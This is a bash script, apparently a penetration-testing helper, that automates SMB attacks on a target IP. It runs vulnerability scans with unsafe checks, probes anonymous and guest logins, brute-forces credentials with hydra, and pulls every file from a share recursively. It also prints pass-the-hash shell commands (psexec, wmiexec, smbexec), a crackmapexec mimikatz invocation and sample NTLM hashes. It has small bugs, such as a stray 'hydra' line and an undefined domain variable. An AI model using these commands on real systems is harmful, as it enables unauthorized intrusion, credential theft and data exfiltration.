#!/bin/bash

# No Color

NC='\033[0m'

# Regular Colors

Purple='\033[0;35m'       # Purple
White='\033[0;37m'        # White
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue

# Bold

BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BWhite='\033[1;37m'       # White

# Underline
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UWhite='\033[4;37m'       # White

# Background

On_Red='\033[41m'         # Red
On_Green='\033[42m'       # Green
On_Yellow='\033[43m'      # Yellow
On_Blue='\033[44m'        # Blue
On_Purple='\033[45m'      # Purple
On_White='\033[47m'       # White



while getopts i:p:a:P:s:U:C: flag
do
    case "${flag}" in
        i) ip=${OPTARG};;
        p) port=${OPTARG};;
	a) user=${OPTARG};;
	P) pass=${OPTARG};;
	s) share=${OPTARG};;
	U) users=${OPTARG};;
	C) passwords=${OPTARG};;
    esac
done


echo -e "\n\n${BPurple}SMB Enumeration${NC}"
echo -e "\n\n${BWhite}NMAP scan:${NC}"
nmap $ip -Pn -n -p $port --script smb-* 


echo -e "\n${Bwhite}NMAP scan for vulns:${NC}"
nmap $ip -p $port --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1


echo -e "\n\n${BWhite}Hostname discovery:${NC}"
echo -e "${BWhite}nmblookup -A $ip${NC}"
nmblookup -A $ip


echo -e "\n\n${BWhite}Discovering version:${NC}"
echo -e "${BWhite}./smbver.sh $ip $port${NC}"
chmod +x smbver.sh
./smbver.sh $ip $port


echo -e "\n\n${BWhite}List Shares:${NC}"
echo -e "${BWhite}smbmap -H $ip${NC}"
smbmap -H $ip
echo -e "\n\n${BWhite}smbmap -u '' -p '' -H $ip${NC}"
smbmap -u '' -p '' -H $ip
echo -e "\n\n${BWhite}smbmap -u 'guest' -p '' -H $ip${NC}"
smbmap -u 'guest' -p '' -H $ip
echo -e "\n\n${BWhite}smbmap -u '' -p '' -H $ip -R${NC}"
smbmap -u '' -p '' -H $ip -R

echo -e "\n\n${BWhite}crackmapexec smb $ip${NC}"
crackmapexec smb $ip
echo -e "\n\n${BWhite}crackmapexec smb $ip -u '' -p ''${NC}"
crackmapexec smb $ip -u '' -p ''
echo -e "\n\n${BWhite}crackmapexec smb $ip -u 'guest' -p ''${NC}"
crackmapexec smb $ip -u 'guest' -p ''
echo -e "\n\n${BWhite}crackmapexec smb $ip -u '' -p '' --shares${NC}"
crackmapexec smb $ip -u '' -p '' --shares

echo -e "\n\n${BWhite}smbclient --no-pass -L //$ip${NC}"
smbclient --no-pass -L //$ip
echo -e "\n\n${BWhite}smbclient -L //$ip/ --option='client min protocol=NT1'${NC}"
smbclient -L //$ip/ --option='client min protocol=NT1'

hydra
echo -e "\n\n${BWhite}hydra -V -f -L $users -P $passwords smb://$ip -u -vV${NC}"
hydra -V -f -L $users -P $passwords smb://$ip -u -vV

echo -e "\n\n${BWhite}Trying to connect to some shares:${NC}"
echo -e "${BWhite}accesschk -v -t $ip -u user -P /usr/share/dirb/wordlists/common.txt${NC}"
accesschk -v -t $ip -u $user -P /usr/share/dirb/wordlists/common.txt


echo -e "\n\n${BWhite}Trying to get share items recursively:${NC}"
echo -e "\n${BWhite}1)${NC}"
smbmap -H $ip -d $domain -u $user -p $pass

echo -e "\n${BWhite}2)${NC}"
smbclient -L \\$ip -N


echo -e "\n\n${BWhite}The next two checks can work in some cases:${NC}"
echo -e "\n${BWhite}1)${NC}"
smbclient -L \\$ip -N --option='client min protocol=NT1'

echo -e "\n${BWhite}2)${NC}"
smbclient -L \\$ip -U $user


echo -e "\n\nThis is just a part of the most useful commands that i know. Google to find ways to use information you have found."


if test -z ${share+y}
then
        echo -e "\n${BWhite}No share specified.${NC}"
else
        echo "\n\n${BWhite}Executing commands with share variable...${NC}"
	
	echo -e "\n\n${BWhite}Connect to share${NC}"
	echo -e "${BWhite}smbclient //$ip/$share -N${NC}"
	smbclient //$ip/$share -N

	echo -e "\n${BWhite}Authenticated${NC}"
	echo -e "smbclient //$ip/$share -U $user"
	smbclient //$ip/$share -U $user

	echo -e "\n${BWhite}Just in case${NC}"
	echo -e "\n${BWhite}smbclient //$ip/$share -N --option='client min protocol=NT1${NC}'"
	smbclient //$ip/$share -N --option='client min protocol=NT1'


	echo -e "\n${BWhite}smbclient //$ip/$share${NC}"
	smbclient //$ip/$share
	echo -e "\n${BWhite}smbclient \\\\$ip\\$share${NC}"
	smbclient \\\\$ip\\$share

	echo -e "\n\n${BWhite}Download all files from a directory recursively${NC}"
	echo -e "\n${BWhite}smbclient //$ip/$share -U $user -c 'prompt OFF;recurse ON;mget *'${NC}"
	smbclient //$ip/$share -U $user -c "prompt OFF;recurse ON;mget *"
fi


echo -e "\n\n${BWhite}Additional commands:${NC}"
echo -e "${BWhite}Get a Shell${NC}"
echo -e "psexec.py <DOMAIN>/<USER>:<PASSWORD>@$ip\npsexec.py <DOMAIN>/<USER>@$ip -hashes :<NTHASH>\n\nwmiexec.py <DOMAIN>/<USER>:<PASSWORD>@$ip\nwmiexec.py <DOMAIN>/<USER>@$ip -hashes :<NTHASH>\n\nsmbexec.py <DOMAIN>/<USER>:<PASSWORD>@$ip\nsmbexec.py <DOMAIN>/<USER>@$ip -hashes :<NTHASH>\n\natexec.py <DOMAIN>/<USER>:<PASSWORD>@$ip <COMMAND>\natexec.py <DOMAIN>/<USER>@$ip -hashes :<NTHASH>"

echo -e "\n\n${BWhite}Commands that need hash:${NC}"
echo -e "crackmapexec smb 192.168.1.0/24 -u Administrator -p P@ssw0rd\ncrackmapexec smb 192.168.1.0/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B\ncrackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz 192.168.1.0/24\ncrackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -x whoami $ip\ncrackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B --exec-method smbexec -x whoami $ip ${Blue}# reliable pth code execution${NC}\n\nsmbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip\nsmbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -r ${Blue}# list top level dir${NC}\nsmbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -R ${Blue}# list everything recursively${NC}\nsmbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -s sharename -R -A '.*' ${Blue}# download everything recursively in the wwwroot share to /usr/share/smbmap. great when smbclient doesnt work${NC}\nsmbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -x whoami ${Blue}# no work${NC}"


